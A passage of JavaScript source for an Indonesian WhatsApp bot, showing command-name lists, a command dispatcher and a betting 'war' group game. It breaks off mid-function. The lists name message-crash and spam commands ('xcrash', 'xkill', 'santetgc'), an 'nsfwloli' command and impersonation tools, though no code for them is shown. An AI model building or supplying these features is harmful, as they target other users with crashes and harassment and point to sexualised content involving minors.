		const cmdGrup = ["jadian", "tolak", "terima", "putus", "cekpacar", "intro", "getnamegc", "getname", "getppgc", "getpp", "get", "getid", "getdeskripsigc", "setwelcome", "goodbye", "welcome", "infogrup", "afk", "pppanjang", "linkgrup", "delsetleft", "setleft", "delsetwelcome", "autoaigrup", "setdesk", "setname", "setppgc", "setppgc2", "autodl", "antivirtex", "antipromosi", "antilink2", "antilinkall", "antipolling", "antilink", "antibot", "antibot2", "mute", "kickme", "antisticker", "antiimage", "antivideo", "antidocument", "antiaudio", "antitoxic", "antilinktt", "keamanan", "opentime", "antiwame2", "antiwame", "antionce", "antidelete", "bukajam", "tutupjam", "delsetopen", "setopen", "buka", "cekasalmember", "delsetclose", "setclose", "tutup", "closetime", "demote", "acc", "promote", "add", "kick", "sider", "ceksewa", "infogrup", "delete", "hidetag", "tagall", "revoke", "fitnah", "fakehidetag", "react", "quoted"]
		const cmdMain = ["bot", "price", "script", "katalog", "totalfitur", "cekwaktu", "aturanbot", "donasi", "register", "cekdrive", "owner", "dashboard", "infobot", "cekpremium", "cekbandwidth", "listsewa", "listpremium", "ping", "tes", "bokep", "request", "report"]
		const cmdDown = ["ytvideo2", "ytaudio2", "spotifyplay", "spotify", "spotifydl", "ytmp4", "ytmp3", "ytdocument", "getmusic", "getvideo", "play", "facebook", "fb2", "igvideo", "igphoto", "igstory", "igvideo2", "igphoto2", "igstory2", "capcut", "twitter", "tiktok", "ttnowm", "ttslide", "ttget", "scrol", "tiktoksearch", "tiktoksearch2", "tiktokaudio", "ttnowm3", "tiktok3", "ttnowm2", "tiktok2", "tiktokaudio3", "tiktokaudio2", "mediafire", "gdrivedl", "gitclone"]
		const cmdSearch = ["readmore", "pastebin", "pastegg", "infogempa", "tempmail", "spotifysearch", "whois", "ipwhois", "apikey", "device", "ceksubdo", "cekhost", "cekdns", "cekweb", "sendngl", "urlscan", "infocuaca", "ramalancuaca", "jarak", "lk21", "google", "komikusearch", "liriklagu", "ytsearch", "ytsearch2", "pinterest", "pinterest2", "gimage"]
		const cmdConvert = ["listbahasa", "resize", "removebg", "fast", "earrape", "deep", "blown", "bass", "slow", "robot", "reverse", "nightcore", "fat", "smooth", "tupai", "readvo", "toimage", "tovideo", "tomp4", "tourl", "tinyurl", "toaudio", "tovn", "translate", "sound1 s/d 161", "ssweb2", "ssweb"]
		const cmdGame = ["war", "attack", "tebakkabupaten", "tebakjkt48", "tebakhewan", "tebakml", "tebakchara", "tebaklogo", "tebakaplikasi", "tebakff", "tebakhero", "tebakgame", "tebakgambar", "tebakbendera", "family100", "lengkapikalimat", "asahotak", "tebakkata", "kuisioner", "tebaktebakan", "tebaklirik", "tebakkimia", "tebaksiapa", "tebakkalimat", "tekateki", "caklontong", "susunkata", "nyerah", "bantuan", "werewolf", "slot", "suitpvp", "delttc", "tictactoe", "deltebakbom", "tebakbom", "delcasino", "casino"]
		const cmdAi = ["cococlip", "ocr", "replicate", "photoleap", "img2img", "faceswap", "luminai", "simisimi", "gpt", "ai2", "chatgpt2", "ai", "chatgpt", "aiimg", "qioo", "aidrawing", "ai3", "bingimage2", "bingimage", "txt2video", "stabledif", "diffusion", "differentme2", "differentme", "toanime", "aiscene", "animediffusion", "animediffusion2", "animediffusion3", "animediffusion4", "txt2anime", "txt2waifu", "txt2emoji", "txt2img", "hdr", "hd", "remini", "hdr2", "hd2", "kompres", "hdvid", "dehaze", "recolor", "wink", "remini2", "upscale", "texttosound"]
		const cmdEph = ["ytcomment", "carbon", "glitchtext", "writetext", "advancedglow", "typographytext", "pixelglitch", "neonglitch", "flagtext", "flag3dtext", "deletingtext", "blackpinkstyle", "glowingtext", "underwatertext", "logomaker", "cartoonstyle", "papercutstyle", "watercolortext", "effectclouds", "blackpinklogo", "gradienttext", "summerbeach", "luxurygold", "multicoloredneon", "sandsummer", "galaxywallpaper", "1917style", "makingneon", "royaltext", "freecreate", "galaxystyle", "lighteffects"]
		const cmdFun = ["cekkhodam", "wangy", "kapankah", "sangecek", "ceksange", "gaycek", "cekgay", "lesbicek", "ceklesbi", "cantikcek", "cekcantik", "apakah", "bisakah", "bagaimanakah", "rate", "gantengcek", "cekganteng", "bego", "goblok", "janda", "perawan", "babi", "tolol", "pinter", "pintar", "asu", "bodoh", "gay", "lesby", "bajingan", "jancok", "anjing", "ngentod", "ngentot", "monyet", "mastah", "newbie", "bangsat", "bangke", "sange", "sangean", "dakjal", "horny", "wibu", "puki", "peak", "pantex", "pantek", "setan", "iblis", "cacat", "yatim", "piatu", "masadepan", "masadepannya", "ceksifat", "sifatcek"]
		const cmdIslam = ["listsurah", "asmaulhusna2", "asmaulhusna", "kisahnabi", "jadwalsholat", "randomquran", "quranaudio"]
		const cmdOwn = ["upsaluran", "restart", "listsw", "getsw", "addowner", "delowner", "clearram", "addprem", "delprem", "addsewa", "delsewa", "resetlimit", "bcgc", "bcstiker", "broadcast", "pushkontak", "delchat", "bcsewa", "bcimage", "bcvideo", "bcaudio", "autoblok212", "autoread", "registeronly", "notifregister", "savefile", "gconly", "pconly", "anticall", "autobackup", "autorespond", "set <option>", "settings", "setppbot", "autobio", "prefix", "sampah", "delsampah", "sampah2", "delsampah2", "blok", "unblok", "listblok", "delcase", "addcase", "getcase", "unbanned", "self", "autoaijapri", "addgamelimit", "addlimit", "addbalance", "kurbalance", "listgc", "clearallpc", "clearallgc", "delcmd", "setcmd", "listpc", "join", "leavegc", "public", "banned", "listbanned", "listblacklist", "unblacklist", "blacklist", "listwhitelist", "unwhitelist", "whitelist", "gantifile", "addfunction", "listcase"]
		const cmdStorage = ["delimage","delstiker","delaudio","addaudio", "listaudio", "addimage", "listimage", "addvideo", "delvideo", "listvideo", "addstiker", "liststiker"]
		const cmdAsupan = ["notnot", "kayes", "geayubi", "bocil", "asupan", "hijaber", "ukhty", "santuy", "rikagusriani"]
		const cmdStiker = ["patrick", "doge", "popoci", "sponsbob", "kawan-sponsbob", "awoawo", "chat", "dbfly", "dino-kuning", "gojosatoru", "hope-boy", "jisoo", "kr-robot", "kucing", "manusia-lidi", "menjamet", "meow", "nicholas", "tyni", "qc", "qckode", "stiker", "s", "lonte", "stickergif", "stickerwm", "stickergifwm", "stikersearch", "stikermeme", "smeme", "emojimix", "attp", "ttp"]
		const cmdStalk = ["githubstalk", "igstalk", "getinfochannel", "ffstalk2", "mlstalk", "ffstalk", "ttstalk", "getinfogrup"]
		const cmdRdm = ["couple", "ceritahoror", "cecan", "cosplay", "cogan", "ppcp", "darkjokes", "darkjoke", "memeindo", "meme", "waifu", "akira", "akiyama", "ana", "asuna", "ayuzawa", "boruto", "chitanda", "chitoge", "cosplay", "deidara", "doraemon", "elaina", "emilia", "erza", "fanart", "gremory", "hestia", "hinata", "husbu", "icon", "inori", "isuzu", "itachi", "itori", "kaga", "kagura", "kaguya", "kakasih", "kaneki", "kaori", "keneki", "kosaki", "kotori", "kuriyama", "kuroha", "kurumi", "loli", "madara", "mikasa", "miku", "minato", "naruto", "natsukawa", "nekonime", "nezuko", "nishimiya", "onepiece", "pokemon", "rem", "rize", "sagiri", "sakura", "sasuke", "shina", "shinka", "shizuka", "simp", "tomori", "toukachan", "yatogami", "yuki"]
		const cmdQuo = ["galau", "quotesanime", "quotesdilan", "quotesbucin", "katasindiran", "katahacker", "katacinta", "katabijak", "katailham", "katasenja", "faktaunik", "quotesislamic", "motivasi", "pantun", "puisi", "quotes"]
		const cmdCwe = ["ryujin", "rose", "justina", "jiso", "jeni", "thailand", "japan", "indonesian", "korea", "vietnam", "china"]
		const cmdCwo = ["luhan", "ohsehun", "parkchanyeol", "suga", "wuyifan", "kimjunmyeon", "kimminseok", "kimnanjoon", "kimsoek", "kimtaehyung", "jhope", "jimin", "jungkook", "kimjondae", "kimjong", "baekhyung", "dohkyungsoo", "huangzitao"]
		const cmdBal = ["setprofile", "buygamelimit", "topglobal", "transferlimit", "transfergamelimit", "buylimit", "transfer", "limit"]
		const cmdNsfw = ["ahegao", "ass", "bdsm", "blowjob", "cuckold", "cum", "eba", "ero", "femdom", "foot", "gangbang", "gifs", "glasses", "hentai", "jahy", "manga", "masturbation", "milf", "neko", "neko2", "nsfwloli", "orgy", "panties", "pussy", "tentacles", "thighs", "yuri", "zettai"]
		const cmdAnom = ["menfes", "stopmenfess", "tolakmenfes", "balasmenfes", "start", "mulai", "leave", "keluar", "anonymouschat", "sendprofil", "lanjut", "next"]
		const cmdStore = ["updatelist", "jpm", "jpm2", "addlist", "dellist", "store", "list", "setproses", "bagi", "kali", "kurang", "tambah", "delsetdone", "setdone", "delsetproses"]
		const cmdBug = ["🌷", "🐲", "🐉", "🌵", "🎄", "🌲", "🌳", "🌱", "🌿", "🍀", "☘️", "bugs", "buglink", "spams", "santetgc2", "santetgc"]
		const cmdBugHard = ["xvir", "xstik", "xlist", "xbutton", "x24j", "xuia", "xlec", "xforce", "xva", "xta", "xcrash", "xbom", "xbug", "xkill", "xloc", "xdoc", "xhit"]

		//didyoumean case (langkah di case)
		if (isCmd) {
			if ((m.text || m.caption)) {
				if (!global.help.includes(command) && !budy.startsWith('$ ') && !budy.startsWith('> ')) {
					let mean = didyoumean(command, global.help);
					let sim = similarity(command, mean);
					let similarityPercentage = parseInt(sim * 100);
					if (mean && command.toLowerCase() !== mean.toLowerCase()) {
						let button = [{
							"name": "quick_reply",
							"buttonParamsJson": `{\"display_text\":\"${mean}\",\"id\":\"${prefix + mean}\"}`
						}]
						vreden.sendButtonText(m.chat, button, `*Command Kamu Salah*\n_Mungkin Maksud Anda:_\n\n➠  *${prefix + mean}* (${similarityPercentage}%)\n\n_Ketik ${prefix}allmenu Untuk_\n_Melihat Daftar Fitur_`, footer, m)
					}
				} else if (global.help.includes(command) && !budy.startsWith('$ ') && !budy.startsWith('> ')) {
					usersdb[m.sender].exp += await randomNomor(20);
					addCountCmd(`${command}`, m.sender, _cmd)
		            	if (!isCreator && !isPremium && spamdetek.isFiltered(m.sender)) return vreden.sendMessage(m.chat, {
		            		react: {
			            		text: "⚠️",
		            			key: m.key,
			            	}
		            	})
			        spamdetek.addFilter(m.sender)
			        if (isBan) return m.danger(`Akun Anda Telah Dibanned!!`)
					if (!isCreator && !isPremium && usersdb[m.sender].limit > 1) {
						usersdb[m.sender].limit -= 1
					}
					if (onlyRegister) {
						if (!(command === "daftar") && !(command === "regis") && !(command === "registrasi") && !(command === "register") && !(command === "regkode") && !(command === "captcha") && !(command === "regmail") && !(command === "regismail") && !(command === "regemail") && !(command === "regcode") && !isCreator && !isAdmins) {
							if (!usersdb[m.sender].daftar) return m.warning(`Daftar terlebih dahulu\nguna mengakses fitur ini`)
						}
					}
				}
			}
		}
		switch (command) {
			//▢━━━━━━━━━━━━━━「 GAME COMMAND 」━━━━━━━━━━━━━━▢
			case 'war': {
				vreden.war = vreden.war ? vreden.war : {};
				vreden.war2 = vreden.war2 ? vreden.war2 : {};

				if (!args[0] || args[0] == "help") {
					await vreden.sendMessage(m.chat, {
						text: `*⚔️ WAR BATTLE SQUAD ⚔️*

*War Zone :*
game perang dengan sistem
_turn attack_ (menyerang secara
bergiliran), dimulai dengan 1v1
sampai 5v5, modal perang
diperoleh dari harta rampasan
jika menang, 5k Healthy Point.

keberhasilan tergantung levelmu
dan level musuh yang akan
diserang, waktu menyerang
adalah 40 detik, lebih dari itu 
di anggap AFK (-2500HP).

Tim akan menang jika
Tim lawan kalah semua (0HP)
dan Tim Kamu mendapatkan
harta rampasan perang.

*❏  C O M M A N D S*
*${prefix + command} join A/B* = join game
*${prefix + command} left* = left game
*${prefix + command} money 10xx* = uang taruhan
*${prefix + command} player* = player game
*${prefix + command} start* = start game`,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: idsaluran,
								serverMessageId: null,
								newsletterName: `${namasaluran}`
							},
							externalAdReply: {
								title: "RPG - CLASH SQUAD🛡️",
								body: 'Battle royale, bertempur dengan gaya',
								thumbnailUrl: "https://pomf2.lain.la/f/u7k5ughl.jpg",
								sourceUrl: "-",
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
					break;
				}

				if (args[0] == "money") {
					if (!(m.chat in vreden.war)) {
						await vreden.sendMessage(m.chat, {
							text: `*Silahkan buat room terlebih dahulu (Ketik .war join)*`
						}, {
							quoted: m
						});
						break;
					}
					if (m.sender == vreden.war[m.chat][0].user) {
						if (args[1] != "undefined" && !isNaN(args[1])) {
							args[1] = parseInt(args[1]);
							if (args[1] < 1000) {
								await vreden.sendMessage(m.chat, {
									text: '*Minimal Rp. 1.000*'
								}, {
									quoted: m
								});
								break;
							}
							vreden.war2[m.chat].money = args[1];
							await vreden.sendMessage(m.chat, {
								text: "*Berhasil menetapkan modal perang sebesar Rp. " + Number(args[1]).toLocaleString() + "*"
							}, {
								quoted: m
							});
						} else {
							await vreden.sendMessage(m.chat, {
								text: "*Masukkan modal taruhan perang berupa angka (Tidak boleh menggunakan titik)*\n\n.war money 100000"
							}, {
								quoted: m
							});
						}
					} else {
						await vreden.sendMessage(m.chat, {
							text: `*Hanya @${vreden.war[m.chat][0].user.split('@')[0]} sebagai pembuat room yang bisa mengganti modal awal perang*`,
							contextInfo: {
								mentionedJid: [vreden.war[m.chat][0].user]
							}
						}, {
							quoted: m
						});
					}
					break;
				}

				if (args[0] == "join") {
					if (usersdb[m.sender].saldo < 1000) {
						await vreden.sendMessage(m.chat, {
							text: "*Uang kamu minimal Rp. 1000 untuk bermain game ini.*"
						}, {
							quoted: m
						});
						break;
					}
					if (!(m.chat in vreden.war)) {
						vreden.war2[m.chat] = {
							"war": false,
							"turn": 0,
							"time": 0,
							"money": 0
						};
						vreden.war[m.chat] = [];
						let exp = usersdb[m.sender].exp;
						vreden.war[m.chat][0] = {
							"user": m.sender,
							"hp": 5000,
							"lvl": usersdb[m.sender].level,
							"turn": false
						};
						for (let i = 1; i < 10; i++) {
							vreden.war[m.chat][i] = {
								"user": "",
								"hp": 0,
								"lvl": 0,
								"turn": false
							};
						}
						await vreden.sendMessage(m.chat, {
							text: `*Berhasil masuk ke dalam game sebagai Team A*\n\n*.war join a/b* = join game\n*.war start* = mulai game`
						}, {
							quoted: m
						});
						break;
					} else {
						if (vreden.war2[m.chat].war) {
							await vreden.sendMessage(m.chat, {
								text: `*Permainan sudah dimulai, tidak bisa join.*`
							}, {
								quoted: m
							});
							break;
						}
						for (let i = 0; i < vreden.war[m.chat].length; i++) {
							if (m.sender == vreden.war[m.chat][i].user) {
								let total = 0;
								for (let i = 0; i < 10; i++) {
									if (vreden.war[m.chat][i].user == "") {
										total += 1;
									}
								}
								await vreden.sendMessage(m.chat, {
									text: `*Anda sudah masuk ke dalam game*\n\n*.war join a/b* = join game\n*.war start* = mulai game`
								}, {
									quoted: m
								});
								break;
							}
						}

						if (args[1]) {
							if (args[1].toLowerCase() == "a") {
								if (vreden.war2[m.chat].money == 0) {
									await vreden.sendMessage(m.chat, {
										text: `*Tolong @${vreden.war[m.chat][0].user.split('@')[0]} tetapkan modal awal perang (minimal Rp. 1.000.000)*\n\n.war money 1000000`,
										contextInfo: {
											mentionedJid: [vreden.war[m.chat][0].user]
										}
									}, {
										quoted: m
									});
									break;
								}
								if (usersdb[m.sender].saldo < vreden.war2[m.chat].money) {
									await vreden.sendMessage(m.chat, {
										text: `*Uang kamu minimal Rp. ${vreden.war2[m.chat].money.toLocaleString()} untuk bermain game ini.*`
									}, {
										quoted: m
									});
									break;
								}
								for (let i = 1; i < 5; i++) {
									if (vreden.war[m.chat][i].user == "") {
										let exp = usersdb[m.sender].exp;
										vreden.war[m.chat][i] = {
											"user": m.sender,
											"hp": 5000,
											"lvl": usersdb[m.sender].level,
											"turn": false
										};
										let total = 0;
										for (let i = 0; i < 10; i++) {
											if (vreden.war[m.chat][i].user == "") {
												total += 1;
											}
										}
										await vreden.sendMessage(m.chat, {
											text: `*Berhasil masuk ke dalam game sebagai Team A*\n\n*.war join a/b* = join game\n*.war start* = mulai game`
										}, {
											quoted: m
										});
										break;
									}
								}
							} else if (args[1].toLowerCase() == "b") {
								if (vreden.war2[m.chat].money == 0) {
									await vreden.sendMessage(m.chat, {
										text: `*Tolong @${vreden.war[m.chat][0].user.split('@')[0]} tetapkan modal awal perang (minimal Rp. 1000000)*\n\n.war money 1000000`,
										contextInfo: {
											mentionedJid: [vreden.war[m.chat][0].user]
										}
									}, {
										quoted: m
									});
									break;
								}
								if (usersdb[m.sender].saldo < vreden.war2[m.chat].money) {
									await vreden.sendMessage(m.chat, {
										text: `*Uang kamu minimal Rp. ${vreden.war2[m.chat].money.toLocaleString()} untuk bermain game ini.*`
									}, {
										quoted: m
									});
									break;
								}
								for (let i = 5; i < 10; i++) {
									if (vreden.war[m.chat][i].user == "") {
										let exp = usersdb[m.sender].exp;
										vreden.war[m.chat][i] = {
											"user": m.sender,
											"hp": 5000,
											"lvl": usersdb[m.sender].level,
											"turn": false
										};
										let total = 0;
										for (let i = 0; i < 10; i++) {
											if (vreden.war[m.chat][i].user == "") {
												total += 1;
											}
										}
										await vreden.sendMessage(m.chat, {
											text: `*Berhasil masuk ke dalam game sebagai Team B*\n\n*.war join a/b* = join game\n*.war start* = mulai game`
										}, {
											quoted: m
										});
										break;
									}
								}
							} else {
								await vreden.sendMessage(m.chat, {
									text: `*Pilih salah satu tim A atau B*\n\n.war join A\n.war join B`
								}, {
									quoted: m
								});
							}
						} else {
							await vreden.sendMessage(m.chat, {
								text: `*Pilih salah satu tim A atau B*\n\n.war join A\n.war join B`
							}, {
								quoted: m
							});
						}

						let total = 0;
						for (let i = 0; i < vreden.war[m.chat].length; i++) {
							if (vreden.war[m.chat][i].user != "") {
								total += 1;
							}
							if (total == 10) {
								vreden.war2[m.chat].war = true;
							}
						}
					}
					break;
				}

				if (args[0] == "left") {
					if (vreden.war2[m.chat].war) {
						await vreden.sendMessage(m.chat, {
							text: `*Perang sudah dimulai, anda tidak bisa keluar*`
						}, {
							quoted: m
						});
					} else {
						let found = false;
						for (let i = 0; i < 10; i++) {
							if (m.sender == vreden.war[m.chat][i].user) {
								found = true;
								break;
							}
						}
						if (found) {
							await vreden.sendMessage(m.chat, {
								text: `*Berhasil keluar dari game*`
							}, {
								quoted: m
							});
						} else {
							await vreden.sendMessage(m.chat, {
								text: `*Kamu tidak sedang berada di dalam game*`
							}, {
								quoted: m
							});
						}
					}
					break;
				}

				if (args[0] == "player") {
					if (!(m.chat in vreden.war)) {
						await vreden.sendMessage(m.chat, {
							text: `*Tidak ada pemain yang join room War Zone*`
						}, {
							quoted: m
						});
						break;
					}
					let teamA = [];
					let teamB = [];
					let teamAB = [];
					for (let i = 0; i < vreden.war[m.chat].length; i++) {
						if (i < 5) {
							if (vreden.war[m.chat][i].user != "") teamA.push(vreden.war[m.chat][i].user);
						} else {
							if (vreden.war[m.chat][i].user != "") teamB.push(vreden.war[m.chat][i].user);
						}
						teamAB.push(vreden.war[m.chat][i].user);
					}
					await vreden.sendMessage(m.chat, {
						text: `${vreden.war2[m.chat].war ? '*Giliran : ' + '@' + vreden.war[m.chat][vreden.war2[m.chat].turn].user.split('@')[0] + '*\n*Taruhan : Rp. ' + Number(vreden.war2[m.chat].money).toLocaleString() + '*\n\n' : '*Taruhan : Rp. ' + Number(vreden.war2[m.chat].money).toLocaleString() + '*\n\n' }*TEAM A :*\n` + teamA.map((v, i) => `${vreden.war[m.chat][i].hp > 0 ? '❤️ ' : '☠️ ' }@${v.split('@')[0]} (Lv.${vreden.war[m.chat][i].lvl} HP: ${vreden.war[m.chat][i].hp})`).join`\n` + "\n\n*TEAM B :*\n" + teamB.map((v, i) => `${vreden.war[m.chat][i+5].hp > 0 ? '❤️ ' : '☠️ ' }@${v.split('@')[0]} (Lv.${vreden.war[m.chat][i+5].lvl} HP: ${vreden.war[m.chat][i+5].hp})`).join`\n`,
						contextInfo: {
							mentionedJid: teamAB
						}
					}, {
						quoted: m
					});
					break;
				}

				if (args[0] == "start") {
					if (vreden.war2[m.chat].war) {
						await vreden.sendMessage(m.chat, {
							text: `*Perang sudah dimulai, tidak bisa join.*`
						}, {
							quoted: m
						});
						break;
					}
					let teamA = 0;
					let teamB = 0;
					for (let i = 0; i < 10; i++) {
						if (i < 5) {
							if (vreden.war[m.chat][i].user != "") teamA += 1;
						} else {
							if (vreden.war[m.chat][i].user != "") teamB += 1;
						}
					}

					if (teamA == teamB && teamA > 0) {
						vreden.war2[m.chat].war = true;
						for (let i = 0; i < 5; i++) {
							if (vreden.war[m.chat][i].user != "") {
								let user = vreden.war[m.chat][i].user;
								await vreden.sendMessage(m.chat, {
									text: `*Permainan berhasil dimulai*\n*Silahkan @${user.split('@')[0]} untuk menyerang musuh*\n\n.war player = statistik pemain\n.attack @tag = serang lawan`,
									contextInfo: {
										mentionedJid: [user]
									}
								}, {
									quoted: m
								});
								break;
							}
						}
					} else {
						if (teamA > teamB) {
							await vreden.sendMessage(m.chat, {
								text: `*Team B kurang ${teamA - teamB} orang lagi agar permainan adil.*`
							}, {
								quoted: m
							});
						} else {
							await vreden.sendMessage(m.chat, {
								text: `*Team A kurang ${teamB - teamA} orang lagi agar permainan adil.*`
							}, {
								quoted: m
							});
						}
					}
					break;
				} else {
					return m.warning("Join Duluu")
				}
			}
			break
			case 'attack': {
				vreden.war = vreden.war ? vreden.war : {}
				vreden.war2 = vreden.war2 ? vreden.war2 : {}

				function RandomNo(min, max) {
					min = Math.ceil(min)
					max = Math.floor(max)
					return Math.floor(Math.random() * (max - min + 1)) + min
				}

				async function cekAFK(x) {
					let turn = x
					let time = vreden.war2[m.chat].time
					await sleep(90000)
					let turnNow = vreden.war2[m.chat].turn
					let timeNow = vreden.war2[m.chat].time
					if (turn == turnNow && time == timeNow) {
						vreden.war[m.chat][turn].hp -= 2500
						vreden.sendText(m.chat, `*@${vreden.war[m.chat][turn].user.split('@')[0]} sedang AFK (Denda -2500 HP)*\n\n.war player = statistik pemain\n.attack @tag = serang lawan`, null, {
							contextInfo: {
								mentionedJid: [vreden.war[m.chat][turn].user]
							}
						})
						await sleep(3000)
						if (vreden.war[m.chat][turn].hp <= 0) {
							vreden.sendText(m.chat, `*@${vreden.war[m.chat][turn].user.split('@')[0]} sudah mati karena HP (Health Point) habis.*`, null, {
								contextInfo: {
									mentionedJid: [vreden.war[m.chat][turn].user]
								}
							})
							// cek tim nya
							let playerTotal = 0
							let playerKalah = 0
							if (turn < 5) {
								for (let i = 0; i < 5; i++) {
									if (vreden.war[m.chat][i].user != "") {
										playerTotal += 1
										if (vreden.war[m.chat][i].hp <= 0)
											playerKalah += 1
									}
								}
								// m.reply(playerTotal + "T-K" + playerKalah)
								if (playerTotal > 0 && playerTotal == playerKalah) {
									var teamA = []
									var teamB = []
									var teamAB = []
									for (let j = 0; j < 5; j++) {
										if (vreden.war[m.chat][j].user != "") {
											usersdb[vreden.war[m.chat][j].user].saldo -= Number(vreden.war2[m.chat].money)
											teamA.push(vreden.war[m.chat][j].user)
											teamAB.push(vreden.war[m.chat][j].user)
										}
									}
									for (let j = 5; j < 10; j++) {
										if (vreden.war[m.chat][j].user != "") {
											usersdb[vreden.war[m.chat][j].user].saldo += Number(vreden.war2[m.chat].money)
											teamB.push(vreden.war[m.chat][j].user)
											teamAB.push(vreden.war[m.chat][j].user)
										}
									}
									vreden.sendText(m.chat, `*TEAM B MENANG KARENA TEAM A GOBLOK SEMUA*\n\n*TEAM A :*\n` + teamA.map((v, i) => `${vreden.war[m.chat][i].hp > 0 ? '❤️ ' : '☠️ ' }@${v.split('@')[0]} (- Rp. ${Number(vreden.war2[m.chat].money).toLocaleString()})`).join`\n` + "\n\n*TEAM B :*\n" + teamB.map((v, i) => `${vreden.war[m.chat][i+5].hp > 0 ? '❤️ ' : '☠️ ' }@${v.split('@')[0]} (+ Rp. ${Number(vreden.war2[m.chat].money).toLocaleString()})`).join`\n`, m, {
										contextInfo: {
											mentionedJid: teamAB
										}
									})
									delete vreden.war[m.chat]
									delete vreden.war2[m.chat]
								}
							} else {
								for (let i = 5; i < 10; i++) {
									if (vreden.war[m.chat][i].user != "") {
										playerTotal += 1
										if (vreden.war[m.chat][i].hp <= 0)
											playerKalah += 1
									}
								}
								m.reply(playerTotal + "T-K" + playerKalah)
								if (playerTotal == playerKalah) {
									var teamA = []
									var teamB = []
									var teamAB = []
									for (let j = 0; j < 5; j++) {
										if (vreden.war[m.chat][j].user != "") {
											usersdb[vreden.war[m.chat][j].user].saldo += Number(vreden.war2[m.chat].money)
											teamA.push(vreden.war[m.chat][j].user)
											teamAB.push(vreden.war[m.chat][j].user)
										}
									}
									for (let j = 5; j < 10; j++) {
										if (vreden.war[m.chat][j].user != "") {
											usersdb[vreden.war[m.chat][j].user].saldo -= Number(vreden.war2[m.chat].money)
											teamB.push(vreden.war[m.chat][j].user)
											teamAB.push(vreden.war[m.chat][j].user)
										}
									}
									vreden.sendText(m.chat, `*TEAM A MENANG KARENA TEAM B GOBLOK SEMUA*\n\n*TEAM A :*\n` + teamA.map((v, i) => `${vreden.war[m.chat][i].hp > 0 ? '❤️ ' : '☠️ ' }@${v.split('@')[0]} (+ Rp. ${Number(vreden.war2[m.chat].money).toLocaleString()})`).join`\n` + "\n\n*TEAM B :*\n" + teamB.map((v, i) => `${vreden.war[m.chat][i+5].hp > 0 ? '❤️ ' : '☠️ ' }@${v.split('@')[0]} (- Rp. ${Number(vreden.war2[m.chat].money).toLocaleString()})`).join`\n`, m, {
										contextInfo: {
											mentionedJid: teamAB
										}
									})
									delete vreden.war[m.chat]
									delete vreden.war2[m.chat]
								}
							}
						}
						let pergantian = false
						if (turn < 5) {
							for (let i = 5; i < 10; i++) {
								if (vreden.war[m.chat][i].hp > 0 && vreden.war[m.chat][i].user != "" && vreden.war[m.chat][i].turn == false) {
									vreden.war2[m.chat].turn = i
									vreden.war2[m.chat].time = +1
									pergantian = true
								}
							}
						} else {
							for (let i = 0; i < 5; i++) {
								if (vreden.war[m.chat][i].hp > 0 && vreden.war[m.chat][i].user != "" && vreden.war[m.chat][i].turn == false) {
									vreden.war2[m.chat].turn = i
									vreden.war2[m.chat].time = +1
									pergantian = true
								}
							}
						}
						if (pergantian == false) {
							for (let l = 9; l >= 0; l--) {
								if (vreden.war[m.chat][l].user != "" && vreden.war[m.chat][l].hp > 0) {
									vreden.war2[m.chat].turn = l
									vreden.war2[m.chat].time = +1
								}
								vreden.war[m.chat][l].turn == false
							}
						}
						await sleep(3000)
						vreden.sendText(m.chat, `*Giliran @${vreden.war[m.chat][vreden.war2[m.chat].turn].user.split('@')[0]} untuk menyerang (Waktu 90 detik)*\n\n.war player = statistik pemain\n.attack @tag = serang lawan`, null, {
							contextInfo: {
								mentionedJid: [vreden.war[m.chat][vreden.war2[m.chat].turn].user]
							}
						})
						cekAFK(vreden.war2[m.chat].turn)
					}
				}

				if (!(m.chat in vreden.war)) return m.reply(`*Tidak ada game di grup ini.*`)
				if (!vreden.war2[m.chat].war) return m.reply(`*War belom dimulai, ketik ".war start" untuk memulai pertarungan.*`)
				for (let i = 0; i < 10; i++) {
					if (m.sender == vreden.war[m.chat][i].user) {
						if (i != vreden.war2[m.chat].turn) {
							vreden.sendText(m.chat, `*Sekarang adalah giliran @${vreden.war[m.chat][vreden.war2[m.chat].turn].user.split('@')[0]} untuk menyerang.*`, m, {
								contextInfo: {
									mentionedJid: [vreden.war[m.chat][vreden.war2[m.chat].turn].user]
								}
							})
							cekAFK(vreden.war2[m.chat].turn)
						}
					}
				}
				if (!args[0]) return m.reply(`*Tag musuh yang akan diserang*\n*Ketik .war player*`)
				args[0] = args[0].split('@')[1]
				args[0] += "@s.whatsapp.net"
				let success = false

				if (vreden.war2[m.chat].turn < 5) {
					// return m.reply(args[0])
					for (let i = 5; i < 10; i++) {
						if (vreden.war[m.chat][i].user == args[0] && vreden.war[m.chat][i].hp > 0) {
							let attacker = m.sender
							let target = args[0]

							let opportunity = []
							for (let i = 0; i < usersdb[attacker].level; i++) {
								opportunity.push(attacker)
							}
							for (let i = 0; i < usersdb[target].level; i++) {
								opportunity.push(target)
							}

							let pointAttacker = 0
							let pointTarget = 0
							for (let i = 0; i < 10; i++) {
								if (opportunity[RandomNo(0, opportunity.length)] == attacker) pointAttacker += 1
								else pointTarget += 1
							}

							for (let i = 0; i < 10; i++) {
								if (vreden.war[m.chat][i].user == target) {
									vreden.war[m.chat][i].hp -= pointAttacker * 500
									vreden.war[m.chat][vreden.war2[m.chat].turn].turn = true
									vreden.sendText(m.chat, `*@${attacker.split('@')[0]} menyerang @${target.split('@')[0]} sampai nyawanya berkurang ${pointAttacker * 500} (Sisa HP: ${vreden.war[m.chat][i].hp})*\n\n*@${attacker.split('@')[0]} [${pointAttacker*10}%] - [${pointTarget*10}%] @${target.split('@')[0]}*\n*Level sangat mempengaruhi keberhasilan.*`, m, {
										contextInfo: {
											mentionedJid: [attacker, target]
										}
									})
									await sleep(2000)
									if (vreden.war[m.chat][i].hp <= 0) vreden.sendText(m.chat, `*@${target.split(`@`)[0]} sudah mati dalam pertarungan.*`, m, {
										contextInfo: {
											mentionedJid: [target]
										}
									})
									success = true
								}
							}
						}
					}
					if (success == false) {
						return m.reply(`*Masukkan list pemain game yang benar bos.*\n\n*Cek ".war player"*`)
					} else {
						for (let i = 0; i < 10; i++) {
							if (m.sender == vreden.war[m.chat][i].user) {
								vreden.war[m.chat][i].turn = true
							}
						}
					}
				} else {
					for (let i = 0; i < 5; i++) {
						if (vreden.war[m.chat][i].user == args[0] && vreden.war[m.chat][i].hp > 0) {
							let attacker = m.sender
							let target = args[0]

							let opportunity = []
							for (let i = 0; i < usersdb[attacker].level; i++) {
								opportunity.push(attacker)
							}
